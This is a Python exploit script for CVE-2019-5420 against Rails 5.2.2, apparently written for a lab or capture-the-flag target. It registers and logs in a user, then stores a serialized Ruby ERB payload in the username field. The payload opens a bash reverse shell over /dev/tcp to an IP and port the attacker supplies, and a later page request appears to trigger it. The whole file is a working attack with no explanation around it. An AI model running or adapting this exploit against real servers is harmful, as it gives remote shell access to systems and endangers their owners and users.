import requests
import re
import sys
 
if len(sys.argv) != 5:
    print("[+]Need Arguments!!!!")
    print(f"[+]Usage: {sys.argv[0]} <target_url> <port> <YourIP> <PORT>")
    exit(0)


banner = """

   ___ _____                 ___     _  _  ____  _     _____
  / _ \___ / _ __ ___       / __\ __| || || ___|| |__ |___ / _ __
 / /_\/ |_ \| '_ ` _ \     / / | '__| || ||___ \| '_ \  |_ \| '__|
/ /_\\ ___) | | | | | |   / /__| |  |__   _|__) | | | |___) | |
\____/|____/|_| |_| |_|___\____/_|     |_||____/|_| |_|____/|_|
                     |_____|

+-------------------------------------+
|[+]CVE-2019-5420                     |
|[+]Target: Rails 5.2.2               |
+-------------------------------------+
"""
print(banner)

URL=f'{sys.argv[1]}:{sys.argv[2]}'
username='myuser4'
password='mypass4'
email='myuser4@mail.com'
 
#if len(sys.argv) != 4:
#    print("specify target IP, your IP and port: python3 rev.py 10.10.xx.xx 9001")
#    exit(0)
 
s = requests.Session()
 
resp = s.get(URL + '/signup')
rx = r'token" content="(.*)"'
 
token = re.search(rx,resp.text).group(1)
 
# create user
data = {}
data['utf8'] = 'â'
data['authenticity_token'] = token
data['user[username]'] = username
data['user[email]'] = email
data['user[password]'] = password
data['commit'] = 'Create User'
resp = s.post(URL + '/users', data=data)
 
# login
data = {}
data['utf8'] = 'â'
data['authenticity_token'] = token
data['session[email]'] = email
data['session[password]'] = password
data['commit'] = 'Log in'
resp = s.post(URL + '/login', data=data)
 
rx = r'href="/users/(.*)"'
user_id = re.search(rx,resp.text).group(1)
 
# rev shell
rev = "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(sys.argv[3], sys.argv[4])
payload = '\x04\x08o\x3A\x40ActiveSupport\x3A\x3ADeprecation\x3A\x3ADeprecatedInstanceVariableProxy'
payload += '\x09\x3A\x0E\x40instanceo\x3A\x08ERB\x08\x3A\x09\x40srcI\x22'
payload += '{}\x60{}\x60'.format(chr(len(rev)+7), rev)
payload += '\x06\x3A\x06ET\x3A\x0E\x40filenameI\x22\x061\x06\x3B\x09T\x3A\x0C\x40linenoi\x06\x3A\x0C\x40method\x3A'
payload += '\x0Bresult\x3A\x09\x40varI\x22\x0C\x40result\x06\x3B\x09T\x3A\x10\x40deprecatorIu\x3A\x1F'
payload += 'ActiveSupport\x3A\x3ADeprecation\x00\x06\x3B\x09T'
 
data = {}
data['utf8'] = 'â'
data['authenticity_token'] = token
data['_method'] = 'patch'
data['user[username]'] = payload
data['commit'] = 'Update User'
s.post(URL + '/users/' + user_id, data=data)
s.post(URL + '/users/' + user_id, data=data)
 
s.get(URL + '/articles')
 
